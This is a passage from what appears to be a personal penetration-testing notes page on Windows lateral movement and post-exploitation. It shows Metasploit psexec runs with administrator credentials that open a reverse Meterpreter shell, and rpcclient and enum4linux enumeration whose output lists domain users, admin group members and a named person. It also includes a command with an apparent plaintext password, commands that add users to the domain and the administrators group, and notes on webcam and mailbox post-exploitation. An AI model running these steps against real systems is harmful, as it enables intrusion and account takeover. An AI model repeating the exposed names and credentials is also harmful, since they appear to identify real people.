<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Datei</span> <span class="s2">&quot;C:\Windows\hnFrgUVk.exe&quot;</span> <span class="n">belongs</span> <span class="n">to</span> <span class="n">virus</span><span class="o">/</span><span class="n">spyware</span> <span class="s1">&#39;Troj/Swrort-K&#39;</span><span class="o">.</span>
</pre></div>
</div>
<p>Let&#8217;s try with target 1, the powershell</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>msf exploit(psexec) &gt; set smbdomain .
smbdomain =&gt; .
msf exploit(psexec) &gt; set smbuser Administrat0r
smbuser =&gt; Administrat0r
msf exploit(psexec) &gt; set smbpass Passw0rd!!
smbpass =&gt; Passw0rd!!
msf exploit(psexec) &gt; set rhost 10.0.5.180
rhost =&gt; 10.0.5.180
msf exploit(psexec) &gt; run

[*] Started reverse TCP handler on 10.11.43.116:4444
[*] 10.0.5.180:445 - Connecting to the server...
[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...
[*] 10.0.5.180:445 - Selecting PowerShell target
[*] 10.0.5.180:445 - Executing the payload...
[+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
msf exploit(psexec) &gt; run

[*] Started reverse TCP handler on 10.11.43.116:4444
[*] 10.0.5.180:445 - Connecting to the server...
[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...
[*] 10.0.5.180:445 - Selecting PowerShell target
[*] 10.0.5.180:445 - Executing the payload...
[+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (957487 bytes) to 10.0.5.180
[*] Meterpreter session 1 opened (10.11.43.116:4444 -&gt; 10.0.5.180:64783) at 2017-02-20 16:31:41 +0530

meterpreter &gt;
</pre></div>
</div>
<p>Let&#8217;s try also with target 3: MOF Upload</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">target</span> <span class="mi">3</span>
<span class="n">target</span> <span class="o">=&gt;</span> <span class="mi">3</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="mf">10.11</span><span class="o">.</span><span class="mf">43.116</span><span class="p">:</span><span class="mi">4444</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">the</span> <span class="n">server</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="k">as</span> <span class="n">user</span> <span class="s1">&#39;Administrat0r&#39;</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Trying</span> <span class="n">wbemexec</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Uploading</span> <span class="n">Payload</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Created</span> <span class="o">%</span><span class="n">SystemRoot</span><span class="o">%</span>\<span class="n">system32</span>\<span class="n">KiaHTgBg</span><span class="o">.</span><span class="n">exe</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Uploading</span> <span class="n">MOF</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Created</span> <span class="o">%</span><span class="n">SystemRoot</span><span class="o">%</span>\<span class="n">system32</span>\<span class="n">wbem</span>\<span class="n">mof</span>\<span class="mi">5</span><span class="n">SZ1WZENmHyays</span><span class="o">.</span><span class="n">MOF</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">completed</span><span class="p">,</span> <span class="n">but</span> <span class="n">no</span> <span class="n">session</span> <span class="n">was</span> <span class="n">created</span><span class="o">.</span>
</pre></div>
</div>
</div>
<div class="section" id="sysinternals-psexec">
<h3>Sysinternals psexec<a class="headerlink" href="#sysinternals-psexec" title="Permalink to this headline">¶</a></h3>
</div>
<div class="section" id="smbclient">
<h3>smbclient:<a class="headerlink" href="#smbclient" title="Permalink to this headline">¶</a></h3>
</div>
<div class="section" id="rpclient">
<h3>rpclient<a class="headerlink" href="#rpclient" title="Permalink to this headline">¶</a></h3>
<blockquote>
<div>eskoudis presents great amount of information at <a class="reference external" href="https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions">Plundering Windows Account Infor via Authenticated SMB Session</a>
carnal0wnage have written <a class="reference external" href="http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html">Enumerating user accounts on linux and OSX</a>
and BlackHills have written <a class="reference external" href="http://www.blackhillsinfosec.com/?p=4645">Password Spraying and Other Fun with RPC Client</a>  Most of the stuff has been taken from the above three.</div></blockquote>
<ul class="simple">
<li>Connection:</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="n">xxxxs</span><span class="o">.</span><span class="n">hxxxx</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">mlxxxxh</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">65.103</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Version of the target Windows machine:</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; srvinfo
10.0.65.103    Wk Sv BDC Tim NT
platform_id     :       500
os version      :       6.3
server type     :       0x801033
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>enum commands:</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; enum

enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
enumdata       enumdomgroups  enumforms      enumports   enumtrust
enumdataex     enumdomusers   enumjobs       enumprinter
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Tell the current domain</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">enumdomains</span>
<span class="n">name</span><span class="p">:[</span><span class="n">xxxx</span><span class="p">]</span> <span class="n">idx</span><span class="p">:[</span><span class="mh">0x0</span><span class="p">]</span>
<span class="n">name</span><span class="p">:[</span><span class="n">Builtin</span><span class="p">]</span> <span class="n">idx</span><span class="p">:[</span><span class="mh">0x0</span><span class="p">]</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Enum Domain info</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; querydominfo
Domain:               xxxx
Server:               HMC_PDC-TEMP
Comment:
Total Users:  9043
Total Groups: 0
Total Aliases:        616
Sequence No:  1
Force Logoff: -1
Domain Server State:  0x1
Server Role:  ROLE_DOMAIN_BDC
Unknown 3:    0x1
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p class="first">Enum Domain users:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; enumdomusers
user:[administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[_STANDARD] rid:[0x3ee]
user:[Install] rid:[0x3fa]
user:[sko] rid:[0x43a]
user:[cap] rid:[0x589]
user:[zentrale] rid:[0x67f]
user:[dbserver] rid:[0x7d9]
user:[JVOO] rid:[0x7fa]
user:[arupp] rid:[0x832]
user:[Standard HMC User Te] rid:[0x8a0]
user:[event] rid:[0x8d5]
user:[mrichte] rid:[0x922]
user:[remote] rid:[0x9ea]
user:[pda-vis1] rid:[0xb65]
user:[TestUser] rid:[0xc46]
user:[zermatt] rid:[0xf03]
user:[northamerica] rid:[0xf05]
user:[xxxx-pikett] rid:[0xf90]
user:[oeinstall] rid:[0x1133]
user:[repro] rid:[0x13c3]
</pre></div>
</div>
</li>
<li><p class="first">Enum Domain groups:</p>
</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[xxxx Users] rid:[0x4d8]
group:[IC Members] rid:[0x50d]
group:[Event Management] rid:[0x8d7]
group:[SMSInternalCliGrp] rid:[0x9f5]
group:[IT Support] rid:[0x105b]
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Enum Group Information and Group Membership</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; querygroup 0x200
Group Name:     Domain Admins
Description:    Designated administrators of the domain
Group Attribute:7
Num Members:16
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; querygroupmem 0x200
rid:[0x2227] attr:[0x7]
rid:[0x3601] attr:[0x7]
rid:[0x36aa] attr:[0x7]
rid:[0x36e0] attr:[0x7]
rid:[0x3c23] attr:[0x7]
rid:[0x5528] attr:[0x7]
rid:[0x1f4] attr:[0x7]
rid:[0x363b] attr:[0x7]
rid:[0x573e] attr:[0x7]
rid:[0x56bc] attr:[0x7]
rid:[0x5e5e] attr:[0x7]
rid:[0x7fe1] attr:[0x7]
rid:[0x86d9] attr:[0x7]
rid:[0x9367] attr:[0x7]
rid:[0x829c] attr:[0x7]
rid:[0xa26e] attr:[0x7]
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Enumerate specfic User/ computer information by RID</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; queryuser 0x3601
User Name   :   mahodel_s
Full Name   :   Martin Hodel
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   E 5.5.2008 Admin
Workstations:
Comment     :
Logon Time               :      Tue, 24 Jan 2017 19:28:14 IST
Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
Kickoff Time             :      Thu, 14 Sep 30828 08:18:05 IST
Password last set Time   :      Fri, 21 Nov 2008 02:34:34 IST
Password can change Time :      Fri, 21 Nov 2008 02:34:34 IST
Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Get Domain Password Policy</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; getdompwinfo
min_password_length: 8
password_properties: 0x00000000
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Get user password policies</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; getusrdompwinfo 0x3601
min_password_length: 8
&amp;info.password_properties: 0x433e6584 (1128162692)
0: DOMAIN_PASSWORD_COMPLEX
0: DOMAIN_PASSWORD_NO_ANON_CHANGE
1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
0: DOMAIN_PASSWORD_STORE_CLEARTEXT
0: DOMAIN_REFUSE_PASSWORD_CHANGE
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="enum4linux">
<h3>Enum4linux<a class="headerlink" href="#enum4linux" title="Permalink to this headline">¶</a></h3>
<p>Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com).</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Usage</span><span class="p">:</span> <span class="o">./</span><span class="n">enum4linux</span><span class="o">.</span><span class="n">pl</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span> <span class="n">ip</span>

<span class="n">Options</span> <span class="n">are</span> <span class="p">(</span><span class="n">like</span> <span class="s2">&quot;enum&quot;</span><span class="p">):</span>
    <span class="o">-</span><span class="n">U</span>        <span class="n">get</span> <span class="n">userlist</span>
    <span class="o">-</span><span class="n">M</span>        <span class="n">get</span> <span class="n">machine</span> <span class="nb">list</span><span class="o">*</span>
    <span class="o">-</span><span class="n">S</span>        <span class="n">get</span> <span class="n">sharelist</span>
    <span class="o">-</span><span class="n">P</span>        <span class="n">get</span> <span class="n">password</span> <span class="n">policy</span> <span class="n">information</span>
    <span class="o">-</span><span class="n">G</span>        <span class="n">get</span> <span class="n">group</span> <span class="ow">and</span> <span class="n">member</span> <span class="nb">list</span>
    <span class="o">-</span><span class="n">d</span>        <span class="n">be</span> <span class="n">detailed</span><span class="p">,</span> <span class="n">applies</span> <span class="n">to</span> <span class="o">-</span><span class="n">U</span> <span class="ow">and</span> <span class="o">-</span><span class="n">S</span>
    <span class="o">-</span><span class="n">u</span> <span class="n">user</span>   <span class="n">specify</span> <span class="n">username</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="n">default</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
    <span class="o">-</span><span class="n">p</span> <span class="k">pass</span>   <span class="n">specify</span> <span class="n">password</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="n">default</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>


<span class="n">Additional</span> <span class="n">options</span><span class="p">:</span>
   <span class="o">-</span><span class="n">a</span>        <span class="n">Do</span> <span class="nb">all</span> <span class="n">simple</span> <span class="n">enumeration</span> <span class="p">(</span><span class="o">-</span><span class="n">U</span> <span class="o">-</span><span class="n">S</span> <span class="o">-</span><span class="n">G</span> <span class="o">-</span><span class="n">P</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">o</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">.</span>
             <span class="n">This</span> <span class="n">opion</span> <span class="ow">is</span> <span class="n">enabled</span> <span class="k">if</span> <span class="n">you</span> <span class="n">don</span><span class="s1">&#39;t provide any other options.</span>
   <span class="o">-</span><span class="n">h</span>        <span class="n">Display</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
   <span class="o">-</span><span class="n">r</span>        <span class="nb">enumerate</span> <span class="n">users</span> <span class="n">via</span> <span class="n">RID</span> <span class="n">cycling</span>
   <span class="o">-</span><span class="n">R</span> <span class="nb">range</span>  <span class="n">RID</span> <span class="n">ranges</span> <span class="n">to</span> <span class="nb">enumerate</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="mi">500</span><span class="o">-</span><span class="mi">550</span><span class="p">,</span><span class="mi">1000</span><span class="o">-</span><span class="mi">1050</span><span class="p">,</span> <span class="n">implies</span> <span class="o">-</span><span class="n">r</span><span class="p">)</span>
   <span class="o">-</span><span class="n">K</span> <span class="n">n</span>      <span class="n">Keep</span> <span class="n">searching</span> <span class="n">RIDs</span> <span class="n">until</span> <span class="n">n</span> <span class="n">consective</span> <span class="n">RIDs</span> <span class="n">don</span><span class="s1">&#39;t correspond to</span>
             <span class="n">a</span> <span class="n">username</span><span class="o">.</span>  <span class="n">Impies</span> <span class="n">RID</span> <span class="nb">range</span> <span class="n">ends</span> <span class="n">at</span> <span class="mf">999999.</span> <span class="n">Useful</span>
             <span class="n">against</span> <span class="n">DCs</span><span class="o">.</span>
   <span class="o">-</span><span class="n">l</span>        <span class="n">Get</span> <span class="n">some</span> <span class="p">(</span><span class="n">limited</span><span class="p">)</span> <span class="n">info</span> <span class="n">via</span> <span class="n">LDAP</span> <span class="mi">389</span><span class="o">/</span><span class="n">TCP</span> <span class="p">(</span><span class="k">for</span> <span class="n">DCs</span> <span class="n">only</span><span class="p">)</span>
   <span class="o">-</span><span class="n">s</span> <span class="n">file</span>   <span class="n">brute</span> <span class="n">force</span> <span class="n">guessing</span> <span class="k">for</span> <span class="n">share</span> <span class="n">names</span>
   <span class="o">-</span><span class="n">k</span> <span class="n">user</span>   <span class="n">User</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">that</span> <span class="n">exists</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">system</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="n">administrator</span><span class="p">,</span><span class="n">guest</span><span class="p">,</span><span class="n">krbtgt</span><span class="p">,</span><span class="n">domain</span> <span class="n">admins</span><span class="p">,</span><span class="n">root</span><span class="p">,</span><span class="nb">bin</span><span class="p">,</span><span class="n">none</span><span class="p">)</span>
             <span class="n">Used</span> <span class="n">to</span> <span class="n">get</span> <span class="n">sid</span> <span class="k">with</span> <span class="s2">&quot;lookupsid known_username&quot;</span>
             <span class="n">Use</span> <span class="n">commas</span> <span class="n">to</span> <span class="k">try</span> <span class="n">several</span> <span class="n">users</span><span class="p">:</span> <span class="s2">&quot;-k admin,user1,user2&quot;</span>
   <span class="o">-</span><span class="n">o</span>        <span class="n">Get</span> <span class="n">OS</span> <span class="n">information</span>
   <span class="o">-</span><span class="n">i</span>        <span class="n">Get</span> <span class="n">printer</span> <span class="n">information</span>
   <span class="o">-</span><span class="n">w</span> <span class="n">wrkg</span>   <span class="n">Specify</span> <span class="n">workgroup</span> <span class="n">manually</span> <span class="p">(</span><span class="n">usually</span> <span class="n">found</span> <span class="n">automatically</span><span class="p">)</span>
   <span class="o">-</span><span class="n">n</span>        <span class="n">Do</span> <span class="n">an</span> <span class="n">nmblookup</span> <span class="p">(</span><span class="n">similar</span> <span class="n">to</span> <span class="n">nbtstat</span><span class="p">)</span>
   <span class="o">-</span><span class="n">v</span>        <span class="n">Verbose</span><span class="o">.</span>  <span class="n">Shows</span> <span class="n">full</span> <span class="n">commands</span> <span class="n">being</span> <span class="n">run</span> <span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">rpcclient</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span>enum4linux -P -d xxxx.abcxxx.net -u mluesch -p threE333\$\$ 10.0.65.103
</pre></div>
</div>
</div>
<div class="section" id="winrm">
<h3>WinRM<a class="headerlink" href="#winrm" title="Permalink to this headline">¶</a></h3>
</div>
<div class="section" id="wmi">
<h3>WMI<a class="headerlink" href="#wmi" title="Permalink to this headline">¶</a></h3>
</div>
<div class="section" id="dcom">
<h3>DCOM<a class="headerlink" href="#dcom" title="Permalink to this headline">¶</a></h3>
<ul class="simple">
<li>MMC20 + Two others Methods (Ask Tanoy/ read) - Enignma</li>
</ul>
</div>
<div class="section" id="xfreerdp-remote-desktop">
<h3>xfreerdp/ Remote Desktop<a class="headerlink" href="#xfreerdp-remote-desktop" title="Permalink to this headline">¶</a></h3>
<blockquote>
<div><p>&#8212;-dsquery !! SubMSI ? &#8211; Twitter one &#8211; who publishes a lot of stuff ? MSUtil to use RCE? / smbexec?</p>
<p>&#8212;-Any commands if net, or powershell is blocked? or PV/ BH is caught?</p>
</div></blockquote>
<p>Once we get the remote code execution or remote shell, Few useful commands to do recon/ create users</p>
</div>
</div>
<div class="section" id="add-remove-a-local-user">
<h2>Add/ remove/ a local user<a class="headerlink" href="#add-remove-a-local-user" title="Permalink to this headline">¶</a></h2>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">user</span> <span class="o">/</span><span class="n">add</span> <span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="p">[</span><span class="n">password</span><span class="p">]</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">user</span> <span class="n">John</span> <span class="n">xxxxxxxxx</span> <span class="o">/</span><span class="n">ADD</span>

<span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span><span class="n">net</span> <span class="n">user</span> <span class="o">/</span><span class="n">add</span> <span class="n">John</span> <span class="o">*</span>
<span class="n">Type</span> <span class="n">a</span> <span class="n">password</span> <span class="k">for</span> <span class="n">the</span> <span class="n">user</span><span class="p">:</span>
<span class="n">Retype</span> <span class="n">the</span> <span class="n">password</span> <span class="n">to</span> <span class="n">confirm</span><span class="p">:</span>
<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>

<span class="n">Add</span> <span class="n">a</span> <span class="n">domain</span> <span class="n">user</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">user</span> <span class="n">username</span> <span class="n">password</span> <span class="o">/</span><span class="n">ADD</span> <span class="o">/</span><span class="n">DOMAIN</span>
</pre></div>
</div>
</div>
<div class="section" id="add-remove-a-local-user-to-administrator-group">
<h2>Add / remove a local user to administrator group<a class="headerlink" href="#add-remove-a-local-user-to-administrator-group" title="Permalink to this headline">¶</a></h2>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">/</span><span class="n">add</span>
</pre></div>
</div>
</div>
<div class="section" id="get-sessions-of-remote-machines">
<h2>Get sessions of remote machines<a class="headerlink" href="#get-sessions-of-remote-machines" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li>Powerview Get-NetSession</li>
<li>the windows binary? Global / Local?</li>
<li>NETDOM? &#8211; Tanoy</li>
<li>net session</li>
</ul>
</div>
<div class="section" id="view-users-in-domain-workgroup">
<h2>View users in Domain / Workgroup<a class="headerlink" href="#view-users-in-domain-workgroup" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li>Powerview Get-NetUser</li>
<li>net user /domain</li>
<li>netdom ?</li>
</ul>
</div>
<div class="section" id="view-machines-in-domain-workgroup">
<h2>View machines in Domain/ Workgroup<a class="headerlink" href="#view-machines-in-domain-workgroup" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li>Powerview Get-NetComputers</li>
<li>net view /domain ? &#8211; check the functionality</li>
<li>view machines affected by GPP vulnerability</li>
</ul>
</div>
<div class="section" id="id3">
<h2>View users in Domain / Workgroup<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li>Powerview Get-NetGroupMember</li>
<li>Net group / domain? options</li>
<li>BloodHound Group Memberships</li>
<li>Netdom</li>
</ul>
</div>
<div class="section" id="hunting-for-a-particular-user">
<h2>Hunting for a particular User?<a class="headerlink" href="#hunting-for-a-particular-user" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li>Powerview Invoke-UserHunter</li>
<li>BH users_sessions</li>
<li>EventLog AD? How? Not yet successful!</li>
<li>Finding which machine belong to which user? Any other way than above?</li>
<li>Machine belongs to which user AD Properties &#8211; GETADObject (Tanoy)</li>
</ul>
<p>Learning from the field: The post-exploitation</p>
<ul class="simple">
<li>MSF Webcam - Photo-Video/ Recorder modules</li>
<li>The Email- Mailbox Post exploitation &#8211; Also the check if someone has exploited this (check logs) &#8211; which is also connected to Domain?</li>
<li>How does google email works?</li>
<li>File Hunting &#8211; Better ways!! Faster ways!!</li>
</ul>
</div>
</div>


          </div>
        </div>
      </div>
      <div class="clearer"></div>
    </div>
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="LFFSecuringDebian.html" title="Learning from the field : Securing your Debian"
             >next</a></li>
        <li class="right" >
          <a href="index.html" title="The Magic of Learning"
             >previous</a> |</li>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
    <div class="footer" role="contentinfo">
        &#169; Copyright 2017, Vijay Kumar.
    </div>
  </body>
</html>